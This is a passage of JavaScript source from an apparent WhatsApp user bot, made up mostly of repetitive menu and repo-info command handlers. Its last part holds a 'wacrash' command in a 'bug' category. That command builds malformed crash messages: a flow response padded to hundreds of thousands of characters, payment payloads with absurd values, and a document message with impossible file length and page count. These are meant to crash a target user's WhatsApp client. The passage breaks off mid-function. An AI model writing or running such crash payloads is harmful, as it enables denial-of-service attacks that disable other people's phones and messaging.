                        id: `${prefix}groupmenu`
                    },
                    {
                        title: `LOGO MENU`,
                        description: 'Logo commands',
                        id: `${prefix}logomenu`
                    },
		    {
                        title: `BUG MENU`,
                        description: 'Bug commands',
                        id: `${prefix}bugmenu`
                    },
                    {
                        title: `MOVIE MENU`,
                        description: 'Movie commands',
                        id: `${prefix}moviemenu`
                    },   
		    {
                        title: `OTHER MENU`,
                        description: 'Other commands',
                        id: `${prefix}othermenu`
                    },      
                ]
            }
        ]

        let listMessage = {
            title: 'Click Here⎙',
            sections
        };
        conn.sendMessage(from, {
            image: { url: config.LOGO },
    caption: cap,
    footer: config.FOOTER,
                buttons: [
			{
                    buttonId: `${prefix}alive`,
                    buttonText: {
                        displayText: 'ALIVE'
                    },
                },
		{
                    buttonId: `${prefix}ping`,
                    buttonText: {
                        displayText: 'PING'
                    },
                },	
                {
                    buttonId: 'action',
                    buttonText: {
                        displayText: 'ini pesan interactiveMeta'
                    },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify(listMessage),
                    },
                },
            ],
            headerType: 1,
            viewOnce: true
        }, {
            quoted: m
        });
	
}
	
} catch (e) {
reply()
l(e)
}
})   











//============================================================================	

cmd({
    pattern: "downmenu",
    react: "⬇👨‍💻",
    dontAddCommandList: true,
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'	

  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'download'){
  if(!commands[i].dontAddCommandList){

menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})


cmd({
    pattern: "moviemenu",
    react: "⬇👨‍💻",
    dontAddCommandList: true,
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'	

  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'movie'){
  if(!commands[i].dontAddCommandList){

menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})


cmd({
    pattern: "searchmenu",
    react: "👨‍💻",
    dontAddCommandList: true,
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'search'){
  if(!commands[i].dontAddCommandList){
menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})


cmd({
    pattern: "convertmenu",
    react: "👨‍💻",
    dontAddCommandList: true,
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'convert'){
if(!commands[i].dontAddCommandList){
menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})


cmd({
    pattern: "logomenu",
    react: "👨‍💻",
    dontAddCommandList: true,
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'logo'){
if(!commands[i].dontAddCommandList){
menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})


cmd({
  pattern: "mainmenu",
  react: "👨‍💻",
  dontAddCommandList: true,
  filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'main'){
if(!commands[i].dontAddCommandList){
menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})


cmd({
  pattern: "groupmenu",
  react: "👨‍💻",
  dontAddCommandList: true,
  filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'group'){
if(!commands[i].dontAddCommandList){
menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})

cmd({
  pattern: "bugmenu",
  react: "👨‍💻",
  dontAddCommandList: true,
  filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'bug'){
if(!commands[i].dontAddCommandList){
menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

  
        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})

cmd({
  pattern: "othermenu",
  react: "👨‍💻",
  dontAddCommandList: true,
  filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} SUB COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy vajira md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴠᴀᴊɪʀᴀ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴛᴅᴅ*'
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'other'){
if(!commands[i].dontAddCommandList){
menuc += `╭────────●●►\n│ • *${commands[i].pattern}* \n╰────────────────────●●►\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

  
        //await conn.sendMessage(from, { text: commandList }, { quoted: mek });
        await conn.sendMessage(from, {
text: menuc,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1111,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363290448968237@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴅᴅ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
thumbnailUrl: config.LOGO ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}}, { quoted: mek})
    } catch (e) {
        reply('*Error !!*')
        console.log(e)
    }
})
 
//============================================================================

cmd({
    pattern: "sc",
    react: "👨‍💻",
    alias: ["script","repo"],
    desc: "Check bot online or no.",
    category: "main",
    use: '.alive',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
	var msg = mek
if(os.hostname().length == 12 ) hostname = 'replit'
else if(os.hostname().length == 36) hostname = 'heroku'
else if(os.hostname().length == 8) hostname = 'koyeb'
else hostname = os.hostname()
let monspace ='```'
let monspacenew ='`'
var vajiralod = [
"LOADING ●●○○○○",
"LOADING ●●●●○○",
"LOADING ●●●●●●",
"`COMPLETED ✅`"	
]
let { key } = await conn.sendMessage(from, {text: ''})

for (let i = 0; i < vajiralod.length; i++) {
await conn.sendMessage(from, {text: vajiralod[i], edit: key })
}	

const cap = `[👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻]

   *VAJIRA MD WHATSAPP USER BOT* 💫

                     *OUR MISSION*

🐼This is the result of our teams hard work and our technical cybers team owns the bots rights and code rights. Therefore, you have no chance to change and submit our bot under any circumstances And 100 Commands And logo, thumbnail,banner Maker Commands Ai Chatbot feathers On Our Bot


🐼 The main hope of creating this bot is to take full advantage of the WhatsApp app and make its work easier


💡 Various things can be downloaded from this bot.  Also, managing groups, making logos & edit-images in different ways, searching for different things and getting information and more futures included.


⚠️ Also, if your Whatsapp account gets damaged or banned by using this, we are not responsible and you should take responsibility for it.


👨‍💻 OWNER VAJIRA

🎡 *GITHUB:*  https://github.com/VajiraOfficial/VAJIRA_MD

🪩 *OUR CHANNEL:* https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z

*ᴘʟᴇᴀꜱᴇ ꜱᴛᴀʀ ᴛʜᴇ ʀᴇᴘᴏ ᴀɴᴅ ꜰᴏʟʟᴏᴡ ᴍᴇ ᴏɴ ɢɪᴛʜᴜʙ* 
`
	
if (config.MODE === 'nonbutton') {


	
  const sections = [
    {
	title: "",
	rows: [
	    {title: "1", rowId: prefix + 'menu' , description: 'COMMANDS MENU'},
	    {title: "2", rowId: prefix + 'ping' , description: 'VAJIRA-MD SPEED'} ,

	]
    } 
]
const listMessage = {
caption: cap,
image : { url: config.LOGO },	
footer: config.FOOTER,
title: '',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })

} if (config.MODE === 'button') {


                  
        conn.sendMessage(from, {
            image: { url: config.LOGO },
    caption: cap,
    footer: config.FOOTER,
                buttons: [
			{
                    buttonId: `${prefix}menu`,
                    buttonText: {
                        displayText: 'MENU'
                    },
                },
		{
                    buttonId: `${prefix}ping`,
                    buttonText: {
                        displayText: 'PING'
                    },
                },	
            ],
            headerType: 1,
            viewOnce: true
        }, {
            quoted: m
        });
        

}

	
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})

cmd({
    pattern: "wacrash",
    react: "🔖",
    desc: "To take owner number",
    category: "bug",
    use: '.bug 947xxxxx',
    filename: __filename
},    
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

if (!isMe) return reply('_</> owner only..._')   

const vF6 = p94 => {
      conn.sendMessage(m.chat, {
        text: p94,
        contextInfo: {
          mentionedJid: [v26],
          forwardingScore: 9999999,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
            body: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
            previewType: "PHOTO",
            thumbnailUrl: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg",
            thumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg",
            sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z"
          }
        }
      }, {
        quoted: m
      });
    };
	
const v26 = m.key.fromMe ? conn.user.id.split(":")[0] + "@s.whatsapp.net" || conn : m.key.participant || m.key.remoteJid;
    var v16 = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "";
  const v18 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v16) ? v16.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
    const v20 = v16.replace(v18, "").trim().split(/ +/).shift().toLowerCase();
	
        if (!q) {
          return vF6("`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞` \n*𝘊𝘰𝘯𝘵𝘰𝘩 " + (v18 + v20) + " 6289526156543*");
        }
const msg = `\`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\` \n*ᥕᥲі𝗍 𝖿᥆r 𝗍һᥱ ᑲ᥆𝗍 𝗍᥆ rᥱᥲᥴᥱ 𝗍᥆ 𝗍һᥱ ᥱm᥆ȷі 🎀*`

 


   const v96 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };


   const v100 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v103 = {
      key: v100,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };


    const v105 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
const v108 = {
      key: v105,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };

	

/*
    async function f7(p47, p48, p49, p50 = false, p51 = true) {
      var vGenerateWAMessageFromContent7 = generateWAMessageFromContent(p47, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
